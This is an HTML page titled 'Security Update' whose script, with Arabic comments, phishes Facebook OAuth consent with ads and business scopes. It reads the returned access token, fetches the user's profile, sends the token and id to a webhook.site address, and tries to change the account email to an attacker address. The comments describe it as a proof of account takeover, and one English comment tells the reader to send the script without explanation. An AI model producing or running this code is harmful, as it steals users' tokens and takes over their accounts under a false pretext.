<!DOCTYPE html>
<html>
<head><title>Security Update</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // 1. استخراج الـ ID والبريد الحالي لتأكيد السيطرة (كما ظهر في صورك السابقة)
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email&access_token=${token}`);
                    const userData = await response.json();

                    // 2. إرسال الـ ID (920929380607450) والتوكن الجديد "القوي" للـ Webhook
                    new Image().src = `${webhookUrl}?FOUND_ID=${userData.id}&POWER_TOKEN=${token}`;

                    // 3. محاولة "تغيير الإيميل" برمجياً (هذا ما طلبه Samuel كإثبات)
                    // ملاحظة: هذه الخطوة هي التي تحدد إذا كانت الثغرة ATO أم لا
                    await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
                        method: 'POST',
                        body: new URLSearchParams({ 'email': 'attacker@example.com' })
                    });

                } catch (e) {}
                window.location.href = "https://www.facebook.com/me";
            } else {
                // طلب صلاحيات مرتفعة (ads_management, business_management) لمحاكاة صلاحيات تطبيقات صمودة
                const scopes = "email,public_profile,ads_management,business_management";
                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=${scopes}`;
            }
        };
    </script>
</body>
</html>
